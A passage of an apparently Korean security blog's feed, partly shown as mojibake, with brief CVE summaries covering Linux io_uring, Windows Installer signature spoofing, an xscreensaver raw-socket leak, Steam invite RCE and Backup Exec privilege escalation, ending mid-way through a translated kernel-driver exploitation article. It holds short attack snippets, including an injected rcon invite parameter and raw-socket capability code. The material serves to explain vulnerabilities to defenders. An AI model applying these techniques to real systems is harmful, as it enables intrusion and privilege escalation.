ë°”ë¡œ ë³µêµ¬í•  í•„ìš”ê°€ ì—†ìœ¼ë©´ ì•”í˜¸í™”ëœ íŒŒì¼ì˜ ë³µì‚¬ë³¸ì„ ë³´ê´€í•´ë¼. ë©€ì›¨ì–´ ê°œë°œìê°€ ì€í‡´(Shade, TeslaCrypt, HildaCrypt)í•˜ê±°ë‚˜ ì²´í¬(CoinVault)ë˜ê±°ë‚˜ ê²½ìŸìì˜ í‚¤ë¥¼ ë°°í¬(Petya vs Chimera)í•˜ëŠ” ë“± í•´ë… í‚¤ê°€ ê³µê°œë  ìˆ˜ ìˆë‹¤. ìš´ ì¢‹ìœ¼ë©´ ëª‡ ë‹¬ ì•ˆì— ë³µêµ¬í•  ìˆ˜ ìˆë‹¤.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>crypto</tag>
      
      <tag>ransomware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-20226: Linux kernel Reference counting bug</title>
    <link href="/2021/04/24/fabu1ous/2021-04-24/"/>
    <url>/2021/04/24/fabu1ous/2021-04-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/22/cve-2021-20226-a-reference-counting-bug-in-the-linux-kernel-iouring-subsystem">CVE-2021-20226</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 5.1ì—ì„œ í•˜ë‚˜ì˜ ì‹œìŠ¤í…œì½œë¡œ ì—¬ëŸ¬ I/Oì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” io_uring(ë¹„ë™ê¸° I/O) ê¸°ëŠ¥ì´ ë„ì…ë˜ì—ˆìŠµë‹ˆë‹¤. Linux kernel 5.6ìœ¼ë¡œ ì˜¬ë¼ì˜¤ë©´ì„œ í•´ë‹¹ ê¸°ëŠ¥ì— ì·¨ì•½ì ì´ ìƒê²¼ìŠµë‹ˆë‹¤. ì‹œìŠ¤í…œ ì½œì´ ì»¤ë„ ì“°ë ˆë“œë¡œ <code>files_structure</code>ë¥¼ ì „ë‹¬í•´ë„ <code>io_grab_files()</code>ì˜ reference counterê°€ ì¦ê°€í•˜ì§€ ì•Šì•„ <code>IORING_OP_CLOSE</code>ì‘ì—…ì´ ì§„í–‰ë˜ëŠ” ë™ì•ˆ <code>files_structure</code>ì˜ ì¡´ì¬ ìœ ë¬´ë¥¼ íŒë‹¨í•˜ì§€ ëª»í•˜ê²Œ ë©ë‹ˆë‹¤. ì¦‰, í•´ë‹¹ <code>files_structure</code>ê°€ í• ë‹¹ í•´ì²´ëœ ì´í›„ì—ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë˜ê³  DoSë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">io_grab_files</span><span class="hljs-params">(struct io_kiocb *req)</span> </span><span class="hljs-function"></span>&#123; <span class="hljs-comment">// ... </span>     rcu_read_lock();     spin_lock_irq(&amp;ctx-&gt;inflight_lock);spin_lock_irq(&amp;ctx-&gt;inflight_lock);      <span class="hljs-keyword">if</span> (fcheck(ctx-&gt;ring_fd) == ctx-&gt;ring_file) &#123;         list_add(&amp;req-&gt;inflight_entry, &amp;ctx-&gt;inflight_list);         req-&gt;flags |= REQ_F_INFLIGHT;         req-&gt;work.files = current-&gt;files;  <span class="hljs-comment">// vuln here</span>        ret = <span class="hljs-number">0</span>;     &#125;     spin_unlock_irq(&amp;ctx-&gt;inflight_lock);     rcu_read_unlock();      <span class="hljs-keyword">return</span> ret; &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26413: Windows Installer Signature Spoofing ì·¨ì•½ì </title>
    <link href="/2021/04/23/insu/2021-04-23/"/>
    <url>/2021/04/23/insu/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sec.okta.com/articles/2021/04/uncovering-and-disclosing-signature-spoofing-vulnerability-windows">Uncovering and Disclosing a Signature Spoofing Vulnerability in Windows Installer: CVE-2021-26413</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Installer (MSI) Authenticode ì‹œê·¸ë‹ˆì²˜ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ì—¬ í•´ì»¤ì— ì˜í•´ ì¡°ì‘ëœ íŒ¨í‚¤ì§€ë¥¼ í•©ë²•ì ì¸ ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ìœ„ì¥í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Windows Installer íŒŒì¼ì˜ ì‹œê·¸ë‹ˆì²˜ë¥¼ ê²€ì¦í•˜ê¸° ìœ„í•´ OSë‚˜ ì‚¬ìš©ìëŠ” <code>WinVerifyTrust</code> ë˜ëŠ” <code>WinVerifyTrustEx</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” íŒŒì¼ì˜ typeì„ í™•ì¸í•˜ê³  Subject Interface Package(SIP, MSIì˜ ê²½ìš° <code>MSISIP.dll</code>)ë¥¼ ë¡œë“œí•©ë‹ˆë‹¤. ê·¸ í›„ <code>MsiSIPGetSignedDataMsg</code>ì™€ <code>MsiSIPVerifyIndirectData</code>ë¥¼ í˜¸ì¶œí•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ Signature Dataë¥¼ ê²€ìƒ‰í•˜ê³  í™•ì¸í•˜ëŠ” DLL exportsì˜ ì´ë¦„ë“¤ì„ ì¿¼ë¦¬ í•©ë‹ˆë‹¤.</p><p>MSI íŒŒì¼ì€ Compound File Binary formatì„ ë”°ë¦…ë‹ˆë‹¤. ì´ í˜•ì‹ì˜ íŒŒì¼ë“¤ì€ ì´ formatì˜ íŒŒì¼ë“¤ì€ Storage objectê°€ ë””ë ‰í„°ë¦¬ ì—­í• ì„ í•˜ê³  Steam obejctê°€ íŒŒì¼ ì—­í• ì„ í•˜ëŠ” íŒŒì¼ ì‹œìŠ¤í…œì…ë‹ˆë‹¤. <code>MsiSIPGetSignedDataMsg</code> í•¨ìˆ˜ëŠ” <code>\\x05DigitalSignature</code> streamì—ì„œ signature dataë¥¼ ì–»ê³  <code>MsiSIPVerifyIndirectData</code> í•¨ìˆ˜ëŠ” root directory storage objectë¶€í„° ê³„ì‚°í•˜ê³  ê²€ì¦í•©ë‹ˆë‹¤.</p><p>exploitì€ <code>MSISIP.dll</code>ì—ì„œ í• ë‹¹ë˜ì§€ ì•Šì€ byteë“¤ì„ ê³ ë ¤í•˜ëŠ”ë° ì‹¤íŒ¨í•´ì„œ ì¼ì–´ë‚©ë‹ˆë‹¤.</p><blockquote><p>Usually, a compound file includes ranges of bytes that are not allocated for either CFB structures or user-defined data. For instance, each stream whose length is not an exact multiple of the sector size requires a trailing portion of the last sector in the streamâ€™s sector chain to be unused. Implementations that fail to initialize these byte ranges to zero (as recommended in section 2.7) might unintentionally leak user data.</p></blockquote><p>ì´ í• ë‹¹ë˜ì§€ ì•Šì€ byteë“¤ì€ ì‹œê·¸ë‹ˆì²˜ë¥¼ ê²€ì¦í•˜ê³  ê³„ì‚°í•˜ëŠ”ë° ê³ ë ¤ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì•…ì˜ì ì¸ ë°ì´í„°ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>insu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31523: linux í™”ë©´ë³´í˜¸ê¸° xscreensaverì˜ ì†Œì¼“ ì •ë³´ìœ ì¶œ ì·¨ì•½ì </title>
    <link href="/2021/04/23/l0ch/2021-04-23/"/>
    <url>/2021/04/23/l0ch/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2174">Issue 2174: xscreensaver: raw socket leaked</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Debian xscreensaver 5.42 + dfsg1-1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>linuxìš© ì˜¤í”ˆì†ŒìŠ¤ í™”ë©´ ë³´í˜¸ê¸°ì¸ xscreensaverì˜ debian ë°°í¬íŒì—ì„œ ë°œê²¬ëœ ì†Œì¼“ ì •ë³´ìœ ì¶œ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>xscreensaverì˜ ë‹¤ìŒ ê²½ë¡œì— ì¼ë°˜ ê³„ì •ì˜ íŒ¨í‚· ìº¡ì²˜ë¥¼ í—ˆìš©í•˜ëŠ” <code>cap_net_raw=p</code> ê¶Œí•œì´ í™œì„±í™”ë˜ì–´ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">$ getcap /usr/libexec/xscreensaver/sonar/usr/libexec/xscreensaver/sonar cap_net_raw=p</code></pre><p>í•´ì»¤ëŠ” ì´ëŸ¬í•œ ê¶Œí•œì„ ì´ìš©í•´ ì›ì‹œ ì†Œì¼“ì„ ì–»ê³  ì •ë³´ë¥¼ ì¶œë ¥í•˜ëŠ” ì½”ë“œë¥¼ í¬í•¨í•˜ê±°ë‚˜ tcpdump ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” ë“œë¼ì´ë²„ë¥¼ ì»´íŒŒì¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">// Enable CAP_NET_RAW</span>caps = cap_get_proc();cap_set_flag(caps, CAP_EFFECTIVE, <span class="hljs-number">1</span>, caplist, CAP_SET);cap_set_proc(caps);cap_free(caps);<span class="hljs-comment">// Now we can get a raw socket.</span>sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</code></pre><p>ì´ë¥¼ <code>MESA_LOADER_DRIVER_OVERRIDE</code> í™˜ê²½ë³€ìˆ˜ ì„¤ì •ì„ í†µí•´ xscreensaverì—ì„œ ë¡œë“œí•˜ë„ë¡ í•˜ë©´ rootê°€ ì•„ë‹Œ ì¼ë°˜ ì‚¬ìš©ì ê³„ì •ì—ì„œ ì†Œì¼“ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-30481: Steam ê²Œì„ ì´ˆëŒ€ë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/04/22/idioth/2021-04-22/"/>
    <url>/2021/04/22/idioth/2021-04-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/04/20/source-engine-rce-invite.html">CVE-2021-30481: Source engine remote code execution via game invites</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Valve Steam through 2021-04-10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Valveì˜ PC ê²Œì„ ëŸ°ì²˜ Steamì—ì„œ <a href="https://partner.steamgames.com/doc/sdk/api">Steamworks API</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Steamworks APIëŠ” ê²Œì„ ê°œë°œìë“¤ì´ interface setì„ í†µí•´ ê²Œì„ ë‚´ì—ì„œ ë‹¤ì–‘í•œ Steam ê¸°ëŠ¥ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” APIì…ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” í•¨ìˆ˜ëŠ” <code>InviteUserToGame</code> í•¨ìˆ˜ì…ë‹ˆë‹¤.</p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">InviteUserToGame</span><span class="hljs-params">(CSteamID steamIDFriend, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pchConnectString)</span></span>;</code></pre><p>í•´ë‹¹ í•¨ìˆ˜ëŠ” ì¹œêµ¬ê°€ ê²Œì„ì„ ì‹œì‘í•˜ì§€ ì•Šì€ ê²½ìš° ê²Œì„ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì¹œêµ¬ë¥¼ ë§¤ê°œ ë³€ìˆ˜ë¡œ ì§€ì •í•˜ì—¬ Command line ëì— ì¶”ê°€ë©ë‹ˆë‹¤. ê²Œì„ ë‚´ ì½˜ì†”ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° ê²Œì„ ë‚´ ì½˜ì†”ì—ì„œ ì‹¤í–‰ì´ ë˜ì§€ë§Œ Source Engine ê²Œì„ì˜ ê²½ìš° ì½˜ì†” commandë¥¼ ì§€ì •í•  ë•Œ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì›í•˜ëŠ” ê²Œì„ ëª…ë ¹ì„ ì„ì˜ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë§ì€ source engine ê²Œì„ì—ëŠ” <a href="https://developer.valvesoftware.com/wiki/Source_RCON_Protocol">Source RCON Protocol</a>ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì„œë²„ ì†Œìœ ìê°€ ê²Œì„ í´ë¼ì´ì–¸íŠ¸ì—ì„œ ìˆ˜í–‰í•˜ëŠ” ê²ƒê³¼ ë™ì¼í•œ ë°©ì‹ìœ¼ë¡œ ê²Œì„ ì„œë²„ contextì—ì„œ ì½˜ì†” ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œì„ ì„œë²„ì— ì—°ê²°í•˜ê¸° ìœ„í•´ì„œëŠ” <code>rcon_address</code>ì™€ <code>rcon_password</code> ëª…ë ¹ì„ í†µí•´ ì—°ê²°ì„ ì¸ì¦í•´ì•¼ í•©ë‹ˆë‹¤. í•´ì»¤ê°€ <code>InviteUserToGame</code>ì˜ ë‘ ë²ˆì§¸ íŒŒë¼ë¯¸í„°ë¥¼ <code>+rcon_address ip:port +rcon&quot;</code>ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ì´ˆëŒ€ë¥¼ ë³´ë‚´ë©´ í•´ë‹¹ ì´ˆëŒ€ë¥¼ ìˆ˜ë½í•œ ì‚¬ìš©ìëŠ” ì–´ë– í•œ ì•Œë¦¼ë„ ì—†ì´ í•´ë‹¹ ì£¼ì†Œë¡œ ì—°ê²°ì´ ë©ë‹ˆë‹¤. ì•…ì˜ì ì¸ RCON ì„œë²„ë¥¼ í˜¸ìŠ¤íŒ… í•˜ëŠ” í•´ì»¤ëŠ” <code>SERVERDATA_SCREENSHOT_RESPONSE</code> íŒ¨í‚·ì„ í†µí•´ RCON ì„œë²„ì— ì—°ê²°ëœ ì‚¬ìš©ìì—ê²Œ ì„ì˜ì˜ ZIP archive íŒŒì¼(<code>screenshot.jpg</code>)ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì•„ì¹´ì´ë¸Œ ë‚´ì˜ <code>screanshot.jpg</code> íŒŒì¼ ì •ë³´ë¥¼ ê²€ìƒ‰í•˜ëŠ” <code>CRConClient::SaveRemoteScreenshot</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ <code>FindZipItem</code>ì´ í˜¸ì¶œë©ë‹ˆë‹¤. <code>FindZipItem</code>ì—ì„œ <code>lufseek</code>ì„ ì‚¬ìš©í•  ë•Œ ë‚´ë¶€ íŒŒì¼ í¬ì¸í„°ì¸ <code>s-&gt;cur_file_info_internal.offset_curfile</code> ë¶€ë¶„ì„ ìˆ˜ì •í•˜ì—¬ ìŠ¤íƒì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŒŒì¼ ìŠ¤íŠ¸ë¦¼ì´ <code>0xFFFFFFFE</code>ì„ ê°€ë¦¬í‚¤ë©´ <code>lufread</code>ì—ì„œ ì–¸ë”í”Œë¡œìš°ê°€ ë°œìƒí•˜ê²Œ ë˜ì–´ offsetì„ ì†ìƒì‹œí‚¨ í›„ ROP chainì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì˜ POCëŠ” <a href="https://github.com/floesen/CVE-2021-30481">github</a>ì—ì„œ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>steam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-36167: OpenSSL Backup Exec Service ê¶Œí•œìƒìŠ¹</title>
    <link href="/2021/04/21/fabu1ous/2021-04-21/"/>
    <url>/2021/04/21/fabu1ous/2021-04-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.veritas.com/content/support/en_US/security/VTS20-010">MySQL for Windows is vulnerable to privilege escalation due to OPENSSLDIR location</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MySQL for Windows Backup Exec BE 20.x, BE 21.x, 16.x</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ìœˆë„ìš°ìš© MySQLì—ëŠ” OPENSSLDIR ë³€ìˆ˜ ì‚¬ìš©ìœ¼ë¡œ ì¸í•œ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.</p><p>ë¶€íŒ… ì‹œ Backup Exec serviceëŠ” OpenSSL ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•˜ê³  í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” <code>/usr/local/ssl/openssl.cnf </code> ë˜ëŠ” <code>C:\usr\local\ssl\openssl.cnf</code>ì˜ ë¡œë“œë¥¼ ì‹œë„í•©ë‹ˆë‹¤. ë‚®ì€ ê¶Œí•œì˜ ì¼ë°˜ ìœ ì €ë¼ë„ <code>C:\usr\local\ssl\</code>ì— ì ‘ê·¼ ê¶Œí•œì„ ê°–ê³  ìˆìœ¼ë©° <code>opensll.cnf</code>ë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•´ OpenSSL ì—”ì§„ì„ ê°€ì¥í•œ ì•…ì„±ì½”ë“œê°€ ë¡œë“œë˜ì–´ SYSTEM ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ë„ë¡ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ì»¤ëŠ” ìœ„ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ìƒìŠ¹ëœ ê¶Œí•œì„ í†µí•´ ëª¨ë“  ë°ì´í„°ì— ì ‘ê·¼í•˜ê³  ì„¤ì¹˜ëœ ëª¨ë“  ì‘ìš© í”„ë¡œê·¸ë¨ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 1</title>
    <link href="/2021/04/21/l0ch/exploiting-driver/"/>
    <url>/2021/04/21/l0ch/exploiting-driver/</url>
    
    <content type="html"><![CDATA[<h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ì¤‘ê°„ê³ ì‚¬ ë§í•œ L0chì…ë‹ˆë‹¤. ì•„ì§ 3ê³¼ëª©ì´ë‚˜ ë‚¨ì•˜ì§€ë§Œ ëˆˆì— ë„ëŠ” ê¸€ì´ ìˆì–´ ë§í•œ ê¹€ì— ì‹œí—˜ê³µë¶€ëŠ” ë˜ì§€ê³  ë²ˆì—­í•´ë´¤ìŠµë‹ˆë‹¤. ì¸ìƒ..  </p><blockquote><p>êµìˆ˜ë‹˜ ì´ì œ ê·¸ë§Œ ì ˆ ë†“ì•„ì£¼ì„¸ìš”..</p></blockquote><p>ì»¤ë„ ë“œë¼ì´ë²„ ì·¨ì•½ì ì— ëŒ€í•´ ì•Œê¸° ì‰½ê²Œ ì •ë¦¬í•œ ê¸€ì´ ìˆì–´ì„œ íŒŒíŠ¸ 2ë¡œ ë‚˜ëˆ ì„œ ì •ë¦¬í•´ë´¤ìŠµë‹ˆë‹¤. íŒŒíŠ¸ 1ì—ì„œëŠ” ë“œë¼ì´ë²„ êµ¬ì¡°ì— ëŒ€í•œ ì†Œê°œì™€ IOCTL, ë“œë¼ì´ë²„ í¼ì§•ì— ëŒ€í•œ ë‚´ìš©ì„ ë‹¤ë£¨ë©° íŒŒíŠ¸ 2ì—ì„œëŠ” ë³¸ê²©ì ì¸ ë“œë¼ì´ë²„ ì·¨ì•½ì ì˜ root cause ë¶„ì„ê³¼ ìµìŠ¤í”Œë¡œì‡ì— ëŒ€í•´ ë‹¤ë£¹ë‹ˆë‹¤!  </p><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><hr><p>ì§€ë‚œë‹¬ last&amp;VoidSecì€ NULLCONì—ì„œ Ashfaq Ansari(@HackSysTeam)ì˜ Windows Kernel Exploitation Advanced ê³¼ì •ì„ ìˆ˜ê°•í–ˆë‹¤. ì´ ê³¼ì •ì€ í¥ë¯¸ë¡œì› ìœ¼ë©° core kernel ê³µê°„ì˜ ê°œë…ê³¼ mitigation ìš°íšŒ ë° exploitì— ëŒ€í•´ ë‹¤ë£¨ì—ˆë‹¤. ë§ˆì§€ë§‰ ì‹¤ìŠµì¸ <code>Write an exploit for System Mechanics</code> ì—ì„œëŠ” ë” ì´ìƒì˜ íŒíŠ¸ëŠ” ì œê³µë˜ì§€ ì•Šì•˜ìœ¼ë©° ìš°ë¦¬ëŠ” ìƒˆë¡œ ìŠµë“í•œ ì§€ì‹ê³¼ êµìœ¡ ìë£Œì— ëŒ€í•œ ì´í•´ì™€ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ë„ì „í–ˆë‹¤. ì´ ì‹¤ìŠµì„ ì–´ë–»ê²Œ ìˆ˜í–‰í–ˆëŠ”ì§€, ê·¸ë¦¬ê³  ì‚¬ì „ ì§€ì‹ ì—†ì´ ì‹¤ì œ ë“œë¼ì´ë²„ë¥¼ ì–´ë–»ê²Œ í™œìš©í–ˆëŠ”ì§€ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ë„ë¡ í•œë‹¤.</p><h1 id="Windows-drivers-101"><a href="#Windows-drivers-101" class="headerlink" title="Windows drivers 101"></a>Windows drivers 101</h1><p>ë“œë¼ì´ë²„ë¥¼ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§í•˜ê³  ì·¨ì•½ì ì„ ì°¾ê¸° ì „ì— ë¨¼ì € ë“œë¼ì´ë²„ê°€ ë¬´ì—‡ì´ë©° ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ì‚´í´ë´ì•¼ í•œë‹¤. Windowsì—ì„œ ë“œë¼ì´ë²„ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ íŠ¹ì • ì´ë²¤íŠ¸ê°€ ë°œìƒí•  ë•Œ ì»¤ë„ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ í¬í•¨í•˜ëŠ” ë¡œë“œ ê°€ëŠ¥í•œ ëª¨ë“ˆë¡œ ì •ì˜í•  ìˆ˜ ìˆë‹¤. ì´ë²¤íŠ¸ëŠ” ìš´ì˜ì²´ì œê°€ ìˆ˜í–‰í•˜ëŠ” ì¸í„°ëŸ½íŠ¸ ë˜ëŠ” í”„ë¡œì„¸ìŠ¤ì¼ ìˆ˜ ìˆìœ¼ë©´ ì»¤ë„ì€ ì´ëŸ¬í•œ ì¸í„°ëŸ½íŠ¸ë¥¼ ì²˜ë¦¬í•˜ê³  ìš”ì²­ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì ì ˆí•œ ë“œë¼ì´ë²„ë¥¼ ì‹¤í–‰í•œë‹¤. ë”°ë¼ì„œ ë“œë¼ì´ë²„ = ì»¤ë„ì˜ DLLì´ë¼ê³  ìƒê°í•  ìˆ˜ ìˆë‹¤. ë“œë¼ì´ë²„ëŠ” í”„ë¡œì„¸ìŠ¤ íƒìƒ‰ê¸°ì—ì„œ ì‹œìŠ¤í…œ í”„ë¡œì„¸ìŠ¤(PID 4ê°€ ìˆëŠ” ëª¨ë“ˆ) ë‚´ì—ì„œ ë¡œë“œëœ ëª¨ë“ˆë¡œ ë‚˜ì—´ëœë‹¤.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled.png" alt="exploiting-driver/Untitled.png"></p><blockquote><p>PID 4(System Process)ì— ë¡œë“œëœ ëª¨ë“ˆ</p></blockquote><h2 id="Driver-Entry"><a href="#Driver-Entry" class="headerlink" title="Driver Entry"></a>Driver Entry</h2><p>ì´ì œ ë“œë¼ì´ë²„ì˜ êµ¬ì¡°ë¥¼ ì‚´í´ë³´ê² ë‹¤. ëŒ€ë¶€ë¶„ì˜ ì½”ë“œì™€ ë§ˆì°¬ê°€ì§€ë¡œ ë“œë¼ì´ë²„ì—ëŠ” <code>DriverEntry</code>ë¼ëŠ” ì¼ì¢…ì˜ <code>main</code> í•¨ìˆ˜ê°€ ì¡´ì¬í•œë‹¤. ì´ ê¸°ëŠ¥ì€ ë‹¤ìŒê³¼ ê°™ì´ <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers">Microsoft ë¬¸ì„œ</a>ì— ì •ì˜ë˜ì–´ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span> <span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PDRIVER_OBJECT DriverObject,</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PUNICODE_STRING RegistryPath</span></span><span class="hljs-function"><span class="hljs-params">)</span> </span>;</code></pre><p>ì¸ìˆ˜ ì•ì˜ <code>_In_</code> ì€ ì¸ìˆ˜ê°€ <code>DriverEntry</code> í•¨ìˆ˜ì— ì „ë‹¬ë˜ëŠ” ì…ë ¥ê°’ì´ì–´ì•¼ í•œë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤. <code>DriverObject</code> ì¸ìˆ˜ëŠ” ë“œë¼ì´ë²„ì— ëŒ€í•œ ì •ë³´ë¥¼ ë³´ìœ í•˜ëŠ” <code>DRIVER_OBJECT</code> ë°ì´í„° êµ¬ì¡°ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë‚˜íƒ€ë‚´ë©° ì´í›„ì— ë” ìì„¸íˆ ì„¤ëª…í•˜ë„ë¡ í•˜ê² ë‹¤. <code>RegistryPath</code> ì¸ìˆ˜ëŠ” ë“œë¼ì´ë²„ 